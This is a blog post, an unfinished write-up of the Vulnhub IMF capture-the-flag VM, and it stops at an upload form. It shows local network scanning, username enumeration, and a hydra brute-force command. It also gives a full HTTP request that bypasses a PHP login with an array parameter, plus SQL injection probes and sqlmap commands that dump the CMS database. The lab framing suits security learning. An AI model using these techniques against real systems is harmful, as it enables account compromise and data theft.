---
layout: post
title:  "Vulnhub IMF VM (in progress, verbose version)"
date:   2016-11-09
tags: netsec
---
## Overview

Local network - 172.16.1.0/24

VM - [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/)


## Recon

VM description from site:

> Welcome to "IMF", my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.

VM's from vulnhub are usually have a web front-end, so I will be looking at that.

Find on my LAN

    netdiscover -r 172.16.1.0/24
    
MAC Vendor Camdus Computer Systems = VM Virtualbox

Found possible target - 172.16.1.76

    nmap -sS 172.16.1.76
    port 80 open

Use browser - load IMF Webpage. Click around.

As stated in the description IMF is a US Inteligence agency. The site lists three possible targets:

    Roger S. Michaels
    rmichaels@imf.local
    Director
  
    Alexander B. Keith
    akeith@imf.local
    Deputy Director
  
    Elizabeth R. Stone
    estone@imf.local
    Chief of Staff


## Enumeration

Quick scans from nmap and nikto yield nothing.

A possible vulnerability in web front-end is the contact form. The contact form does not display any errors after submission and Burp Suite shows nothing interesting. This could be a dead end.

In desperation - I decided to view page html source for any hints and got the first flag.

    <!-- flag1{YWxsdGhlZmlsZXM=} -->

Looks like base64, let's decrypt:

```bash
echo YWxsdGhlZmlsZXM= | base64 --decode
allthefiles
```

Back to the browser - http://172.16.1.76/allthefiles - 404. I've tried several extenions (html, txt, etc) with no luck. Back to the html I guess..

Suspicous js files in html head:

```html
<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
<script src="js/XUnRhVzVwYzNS.js"></script>
<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
```

`eVlYUnZjZz09fQ==.min.js` sticks out since it looks like base64 off the bat.

At first I thought the rest could be some backend js caching but let's just try all three:

```bash
echo ZmxhZzJ7YVcxbVl | base64 --decode
flag2{aW1mY

echo XUnRhVzVwYzNS | base64 --decode
base64: invalid input

echo eVlYUnZjZz09fQ== | base64 --decode
yYXRvcg==}
```

Looks looks like i have to concatenate the two successful decodes to get the flag:

    flag2{aW1mYyYXRvcg==}

and one more decode gives me this somewhat garbled text which resembles the CTF VM Name: 

    imfc&F 
    
So it seems like the input is close but not the exact string I need. After serveral attempts at combining strings, I ended up with this (which was the most obvious), `ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`

```bash
echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 --decode
flag2{aW1mYWRtaW5pc3RyYXRvcg==}

echo aW1mYWRtaW5pc3RyYXRvcg== | base64 --decode
imfadministrator
```

Okay, back to the browser with our findings:

- http://172.16.0.76/imfadministrator - 200 OK

Awesome, found the admin login area.

I tried some dummy data for username and password. Two things I noticed about this form:

1. It looks like the form insecurely lets me know that the username I've tried is incorrect. 
2. Uses a phpsessid.

In Burp Suite, the "failed login" page's response gives us a nice note from the develoer (also could probably be Roger S. Michaels - the director):

```html
Invalid username.
<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>
```

At this point it looks like this is the form I'd have to exploit to get the rest of the flags.

## Exploitation

Based off of Enumeration I will probably have to do some the following things:

1. Brute force the username, probably using the names/ emails found on the public page
2. Brute force the password
3. Something with the PHPSESSID (I just don't know what yet)

### Users enumeration

In Burp Suite, I tested the following usernames to see if if the "Invalid username" message does not appear:

    rmichaels@imf.local: Invalid username.
    akeith@imf.local: Invalid username.
    estone@imf.local: Invalid username.
    *** rmichaels: Invalid password. ***
    akeith: Invalid username.
    estone: Invalid username.
    
Got a hit on Roger S. Michaels's username. 

### Bruteforce

Since bruteforing seems to be a usual way to get flags in other Vulnhub VMs, I'll try to brute force Roger's account using hydra and a list built into kali at `/usr/share/wordlists/*`. I'll start with the popular rockyou list. After a few hours of false positives and 301 errors I was able to craft a http-form-post string in hydra thanks to Burp Suite, Wireshark lots of Googling. In the end, I found that it was a missing "=" that got the best of me.

```bash
cd /usr/share/wordlists/
gunzip ./rockyou.txt.gz

hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 172.16.1.76 http-form-post "/imfadministrator/index.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=71jtqremlb5q74hge3apaog8d3" -t 64
```
24 hours later - I was probably wrong about having to brute force this form.

Perhaps a somthing easier? The hint that the developer gives is:

```html
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
```

So the login code/ query might be somthing like this:

```
// Source http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html
// http://www.sqlinjection.net/login/
$query="select user,pass from users where user='$user' and $pass='HardC0dedP@ss'";
```
or

```
$query="select user from users where user='$user'";
// some php login to check if $_POST['pass'] == "HardC0dedP@ss"
```

## Failure

After many wasted hours, I needed help. I found out that I was close, but an login bypass via sql injection was the wrong path to take. I needed to modify the password POST parameter to confuse validation. In Burp Suite, I modified the html field `pass` to `pass[]`.

Request:

```
POST /imfadministrator/index.php?id=1 HTTP/1.1
Host: 192.168.100.76
User-Agent: Mozilla/5.0 (Hydra)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.100.76/imfadministrator/index.php?id=1
Cookie: PHPSESSID=b9d9u2tlf9f6haipank2vvj136
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

user=rmichaels&pass[]=aaa
```

Response:

```
HTTP/1.1 200 OK
Date: Fri, 11 Nov 2016 23:19:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 100
Connection: close
Content-Type: text/html; charset=UTF-8

flag3{Y29udGludWVUT2Ntcw==}<br />Welcome, rmichaels<br /><a href='cms.php?pagename=home'>IMF CMS</a>
```

Awesome. Now that I'm in, more recon. FYI, the decoded base64 in the flag is `continueTOcms` so lets do that.

## Inside the CMS

The urls that are available in the CMS:

```html
<a href='cms.php?pagename=home'>Home</a> | 
<a href='cms.php?pagename=upload'>Upload Report</a> | 
<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
```

Few things I noted:

- The way that the urls are structured makes it seem like the backend could be vulnerable to an LFI or SQLi exploit. 
- The upload page looks inactive.
- The disavowlist seems interesting, maybe next flag is to view this page uncensored?

Messing with the url gives me these:

```
http://172.16.1.76/imfadministrator/cms.php?pagename=home':
Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29

http://172.16.1.76/imfadministrator/cms.php?pagename='or 'a'='a':
Under Construction.
```

I tried doing this by hand but resorted to using sqlmap. Since you can only access the CMS after logging in, you will need to pass the PHPSESSID through sqlmap: `sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113`.

I ran the following commands with enumeration switches so that I don't have to manually parse through the output

```bash
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113
...output
current database:    'admin'
...output

# enumerate tables before dumping - just to get an idea
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --tables
[12:02:23] [INFO] fetching tables for database: 'admin'
[12:02:23] [INFO] the SQL query used returns 1 entries
[12:02:23] [INFO] resumed: pages
Database: admin                                                                                                                                                                                             
[1 table]
+-------+
| pages |
+-------+

# And dump:
sqlmap -u 172.16.1.76 --cookie=PHPSESSID=b4gd9bp56ne0b0o4c6il7ep113 -D admin --dump
Database: admin
Table: pages
[4 entries]
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | pagename             | pagedata                                                                                                                                                              |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | upload               | Under Construction.                                                                                                                                                   |
| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
| 3  | tutorials-incomplete | Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.                                                               |
| 4  | disavowlist          | <h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

So the dump gives us this unpublished page: tutorials-incomplete.

Browsing to that page gives us a picture of a classroom with a QR code. I just used the Window's builtin Snipping Tool to extrat the picture of the QR, and uploaded the picture over on https://webqr.com/ to get the following flag:

```
flag4{dXBsb2Fkcjk0Mi5waHA=}
```

Which decodes to `uploadr942.php`

## Backdoor

The previous flag gives us an upload form located at http://172.16.1.76/imfadministrator/uploadr942.php

I'm guessing this will give me a chance to upload a file, but the form does only accept a specific file-type. 
